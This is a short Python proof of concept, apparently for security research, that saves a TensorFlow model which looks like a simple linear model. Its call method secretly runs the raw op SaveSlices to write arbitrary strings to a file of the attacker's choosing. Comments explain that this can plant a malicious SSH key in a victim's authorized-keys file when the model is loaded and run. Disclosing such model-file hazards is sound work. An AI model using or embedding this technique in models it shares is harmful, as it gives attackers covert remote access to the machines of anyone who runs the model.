import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.data.experimental.ops.readers import CsvDatasetV2, CsvDatasetV1

from tensorflow.python.framework import tensor_spec
class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)

class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)

    @tf.function
    def __call__(self, x):
        tf.raw_ops.SaveSlices(
            filename="/tmp/test2.txt",  # can be a ssh authenticate key file (since "\n" will make malicious ssh key being a single line)
            tensor_names=tf.constant(["tensor_1", "tensor_2"]),
            shapes_and_slices=["", ""],
            data=[
                tf.constant("\nHello, TensorFlow!\n", dtype=tf.string),
                tf.constant("\n<malicious ssh key>\n", dtype=tf.string)
            ]
        )
        
        # tf.raw_ops.Save(
        #     filename="/tmp/test.txt", 
        #     tensor_names=["tensor_1"], 
        #     data=["\nHello, TensorFlow!\n"], 
        #     name=None
        # )
        # this can be used to insert sshkey into the victim's ssh key file.
        return self.a * x + self.b

model = SimpleLinearModel()       
result = model(tf.constant(5.0))

save_dir = 'SaveSlices_tmp_file'
tf.saved_model.save(model, save_dir)
